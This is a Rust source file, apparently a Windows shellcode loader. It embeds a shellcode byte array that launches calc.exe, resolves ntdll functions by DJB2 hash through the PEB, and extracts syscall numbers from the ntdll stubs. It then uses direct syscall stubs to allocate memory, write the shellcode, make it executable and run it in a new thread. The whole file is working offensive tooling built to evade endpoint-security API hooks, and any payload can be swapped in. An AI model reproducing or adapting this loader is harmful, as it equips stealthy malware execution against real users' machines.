use std::{arch::global_asm, ffi::CStr, ptr::null_mut};

use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpebteb::PTEB,
    ntpsapi::{PPS_ATTRIBUTE_LIST},
};
use winapi::{
    ctypes::c_void,
    shared::ntdef::{NTSTATUS, POBJECT_ATTRIBUTES},
    um::{
        processthreadsapi::GetCurrentProcess,
        winnt::{
            ACCESS_MASK, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY,
            IMAGE_NT_HEADERS, IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
            PAGE_READWRITE, THREAD_ALL_ACCESS,
        },
    },
};

const BUFFER: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

const NT_ALLOCATE_VIRTUAL_MEMORY_DJB2: u64 = 0x7B2D1D431C81F5F6;
const NT_WRITE_VIRTUAL_MEMORY_DJB2: u64 = 0x54AEE238645CCA7C;
const NT_PROTECT_VIRTUAL_MEMORY_DJB2: u64 = 0xA0DCC2851566E832;
const NT_CREATE_THREAD_EX_DJB2: u64 = 0x2786FB7E75145F1A;

global_asm!(
    "
.section .data
SSN: .word 0

.section .text
.code64

NtAllocateVirtualMemory:
    mov r10, rcx
    mov ax, [rip + SSN]
    syscall
    ret

NtWriteVirtualMemory:
    mov r10, rcx
    mov ax, [rip + SSN]
    syscall
    ret

NtProtectVirtualMemory:
    mov r10, rcx
    mov ax, [rip + SSN]
    syscall
    ret

NtCreateThreadEx:
    mov r10, rcx
    mov ax, [rip + SSN]
    syscall
    ret

"
);

unsafe extern "C" {
    static mut SSN: u16;
}

unsafe extern "win64" {
    fn NtAllocateVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut *mut c_void,
        ZeroBits: u64,
        RegionSize: *mut usize,
        AllocationType: u32,
        Protect: u32,
    ) -> NTSTATUS;

    fn NtWriteVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut c_void,
        Buffer: *mut c_void,
        BufferSize: usize,
        NumberOfBytesWritten: *mut usize,
    ) -> NTSTATUS;

    fn NtProtectVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut *mut c_void,
        RegionSize: *mut usize,
        NewProtect: u32,
        OldProtect: *mut u32,
    ) -> NTSTATUS;

    fn NtCreateThreadEx(
        ThreadHandle: *mut *mut c_void,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: POBJECT_ATTRIBUTES,
        ProcessHandle: *mut c_void,
        StartRoutine: *mut c_void,
        Argument: *mut c_void,
        CreateFlags: u32,
        ZeroBits: usize,
        StackSize: usize,
        MaximumStackSize: usize,
        AttributeList: PPS_ATTRIBUTE_LIST,
    ) -> NTSTATUS;

}

fn djb2_hash(input: &[u8]) -> u64 {
    let mut hash: u64 = 0x77347734DEADBEEF;

    for byte in input {
        hash = (hash << 5).wrapping_add(hash).wrapping_add(*byte as u64);
    }

    hash
}

fn get_current_teb() -> PTEB {
    unsafe {
        let mut teb: PTEB = null_mut();
        #[cfg(target_arch = "x86_64")]
        std::arch::asm!(
            "mov {}, gs:[0x30]",
            out(reg) teb
        );
        #[cfg(target_arch = "x86")]
        std::arch::asm!(
            "mov {}, fs:[0x18]",
            out(reg) teb
        );
        teb
    }
}

fn get_image_export_directory(
    module_base: *mut c_void,
    image_export_directory: *mut *mut IMAGE_EXPORT_DIRECTORY,
) -> bool {
    unsafe {
        let dos_header = module_base as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS header");
            return false;
        }

        let nt_headers = (module_base as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT header");
            return false;
        }

        *image_export_directory = (module_base as *const u8)
            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
            as *mut IMAGE_EXPORT_DIRECTORY;

        if image_export_directory.is_null() {
            println!("[-] Failed to get export directory");
            return false;
        }

        return true;
    }
}

fn get_ssn(hash: u64) -> u16 {
    unsafe {
        let teb = get_current_teb();
        let peb = (*teb).ProcessEnvironmentBlock;

        if teb.is_null() || peb.is_null() || (*peb).OSMajorVersion != 10 {
            println!("[-] Invalid PEB");
            return 0;
        }

        let ldr_data_entry = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;

        let ntdll_base = (*ldr_data_entry).DllBase;
        println!("[+] ntdll.dll base address: {:p}", ntdll_base);

        let mut export_directory: *mut IMAGE_EXPORT_DIRECTORY = null_mut();
        if !get_image_export_directory(ntdll_base, &mut export_directory) {
            println!("[-] Failed to get export directory");
            return 0;
        }

        let address_of_functions = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfFunctions as usize)
            as *const u32;
        let address_of_names = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfNames as usize)
            as *const u32;
        let address_of_name_ordinals = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfNameOrdinals as usize)
            as *const u16;

        for cx in 0..(*export_directory).NumberOfFunctions as isize {
            let function_name =
                (ntdll_base as *const u8).add(*address_of_names.offset(cx) as usize) as *const i8;

            let ordinal = *address_of_name_ordinals.offset(cx) as usize;

            if ordinal >= (*export_directory).NumberOfFunctions as usize {
                continue;
            }

            let function_rva = *address_of_functions.add(ordinal) as usize;
            let function_address = (ntdll_base as *const u8).add(function_rva as usize);

            let c_str = CStr::from_ptr(function_name);

            if let Ok(function_str) = c_str.to_str() {
                if djb2_hash(function_str.as_bytes()) == hash {
                    // let paddress = function_address as *mut c_void;

                    let mut byte = 0;
                    loop {
                        let bytes = function_address as *const u8;
                        if *bytes.offset(byte) == 0x0f && *bytes.offset(byte + 1) == 0x05 {
                            return 0;
                        }

                        if *bytes.offset(byte) == 0xc3 {
                            return 0;
                        }

                        if *bytes.offset(byte) == 0x4c
                            && *bytes.offset(byte + 1) == 0x8b
                            && *bytes.offset(byte + 2) == 0xd1
                            && *bytes.offset(byte + 3) == 0xb8
                            && *bytes.offset(byte + 6) == 0x00
                            && *bytes.offset(byte + 7) == 0x00
                        {
                            let low = *bytes.offset(byte + 4) as u16;
                            let high = *bytes.offset(byte + 5) as u16;
                            let ssn = (high << 8) | low;

                            // if hash == NT_ALLOCATE_VIRTUAL_MEMORY_DJB2 {
                            //     NT_ALLOCATE_VIRTUAL_MEMORY_SSN = ssn;
                            // } else if hash == NT_WRITE_VIRTUAL_MEMORY_DJB2 {
                            //     NT_WRITE_VIRTUAL_MEMORY_SSN = ssn;
                            // } else if hash == NT_PROTECT_VIRTUAL_MEMORY_DJB2 {
                            //     NT_PROTECT_VIRTUAL_MEMORY_SSN = ssn;
                            // } else if hash == NT_CREATE_THREAD_EX_DJB2 {
                            //     NT_CREATE_THREAD_EX_SSN = ssn;
                            // }

                            // println!(
                            //     "[+] Found syscall: {} at address {:p} with SSN: {:0X}",
                            //     function_str, paddress, ssn
                            // );
                            return ssn;

                            // break;
                        }

                        byte += 1;
                    }
                }
            }
        }
        return 0;
    }
}

fn pause() {
    println!("[#] Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn main() {
    unsafe {
        let payload_size = BUFFER.len();

        let h_process = GetCurrentProcess();

        let mut allocated_size = payload_size;

        // println!("Payload size: {}", payload_size);

        let mut paddress: *mut c_void = null_mut();

        let mut ssn = get_ssn(NT_ALLOCATE_VIRTUAL_MEMORY_DJB2);
        SSN = ssn;
        println!("[+] NtAllocateVirtualMemory SSN: 0x{:X}", ssn);

        let mut status = NtAllocateVirtualMemory(
            h_process,
            &mut paddress,
            0,
            &mut allocated_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if status != 0 {
            println!(
                "[-] NtAllocateVirtualMemory failed with status: 0x{:08X}",
                status
            );
            return;
        }

        println!(
            "[+] Allocated memory at: {:p} of size: {}",
            paddress, allocated_size
        );

        ssn = get_ssn(NT_WRITE_VIRTUAL_MEMORY_DJB2);
        SSN = ssn;
        println!("[+] NtWriteVirtualMemory SSN: 0x{:X}", ssn);

        let mut bytes_written = 0;

        status = NtWriteVirtualMemory(
            h_process,
            paddress,
            BUFFER.as_ptr() as *mut c_void,
            payload_size,
            &mut bytes_written,
        );

        if status != 0 {
            println!(
                "[-] NtWriteVirtualMemory failed with status: 0x{:08X}",
                status
            );
            return;
        }

        println!("[+] Written {} bytes to target process", bytes_written);

        ssn = get_ssn(NT_PROTECT_VIRTUAL_MEMORY_DJB2);
        SSN = ssn;
        println!("[+] NtProtectVirtualMemory SSN: 0x{:X}", ssn);

        let mut old_protect: u32 = 0;

        status = NtProtectVirtualMemory(
            h_process,
            &mut paddress as *mut _ as *mut *mut c_void,
            &mut BUFFER.len() as *mut usize,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if status != 0 {
            println!(
                "[-] NtProtectVirtualMemory failed with status: 0x{:08X}",
                status
            );
            return;
        }

        ssn = get_ssn(NT_CREATE_THREAD_EX_DJB2);
        SSN = ssn;
        println!("[+] NtCreateThreadEx SSN: 0x{:X}", ssn);

        let mut thread_handle: *mut c_void = null_mut();

        status = NtCreateThreadEx(
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            null_mut(),
            h_process,
            paddress,
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        );

        if status != 0 {
            println!("[-] NtCreateThreadEx failed with status: 0x{:08X}", status);
            return;
        }
        pause();
    }

}
